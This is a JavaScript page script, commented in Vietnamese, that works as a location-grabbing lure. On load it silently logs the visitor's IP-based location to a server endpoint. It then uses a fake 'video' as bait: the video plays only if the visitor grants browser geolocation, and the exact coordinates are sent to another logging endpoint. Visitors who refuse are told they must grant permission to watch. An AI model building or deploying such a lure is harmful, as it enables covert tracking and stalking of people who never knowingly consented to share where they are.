// Tự động ghi log vị trí ước tính dựa trên IP ngay khi trang được tải
document.addEventListener("DOMContentLoaded", () => {
  console.log("Trang đã tải xong, tự động ghi log vị trí IP...");
  fetch("/api/log-ip-location", { method: "POST" })
    .then((response) => response.json())
    .then((data) => console.log("Phản hồi từ IP logger:", data.message))
    .catch((error) => console.error("Lỗi khi tự động ghi log IP:", error));
});

// Lấy các element cần thiết từ HTML
const triggerElement = document.getElementById("location-trigger");
const videoElement = document.querySelector(".background-video");
const playIcon = document.querySelector(".fa-play");

// Lắng nghe sự kiện click vào khu vực "video"
triggerElement.addEventListener("click", () => {
  // Khi click chỉ gọi hàm hỏi quyền, không phát video ngay
  console.log("Khu vực video được click, chuẩn bị hỏi quyền vị trí...");
  requestLocationPermission();
});

// Hàm yêu cầu cấp quyền
function requestLocationPermission() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
  } else {
    alert("Rất tiếc, trình duyệt của bạn không hỗ trợ lấy vị trí.");
  }
}

// Hàm được gọi khi người dùng ĐỒNG Ý cấp quyền
function successCallback(position) {
  // Chỉ khi người dùng đồng ý, video mới bắt đầu phát và nút play biến mất
  if (videoElement.paused) {
    videoElement.play();
    playIcon.style.display = "none";
  }

  const lat = position.coords.latitude;
  const lon = position.coords.longitude;

  console.log(`Lấy vị trí thành công: Lat ${lat}, Lon ${lon}`);

  // Gửi tọa độ chính xác lên server để ghi log
  fetch("/api/log-precise-location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ latitude: lat, longitude: lon }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Server responded with an error");
      }
      return response.json();
    })
    .then((data) => {
      console.log("Phản hồi từ server (ghi log chính xác):", data);
    })
    .catch((error) => {
      console.error("Lỗi khi gửi vị trí chính xác lên server:", error);
    });
}

// Hàm được gọi khi người dùng TỪ CHỐI cấp quyền hoặc có lỗi
function errorCallback(error) {
  console.log(`Có lỗi xảy ra: ${error.message}`);
  switch (error.code) {
    case error.PERMISSION_DENIED:
      alert("Bạn phải cấp quyền mới xem được video");
      break;
    case error.POSITION_UNAVAILABLE:
      alert("Không thể xác định được vị trí của bạn.");
      break;
    case error.TIMEOUT:
      alert("Yêu cầu lấy vị trí đã hết hạn.");
      break;
    default:
      alert("Một lỗi không xác định đã xảy ra.");
      break;
  }
}
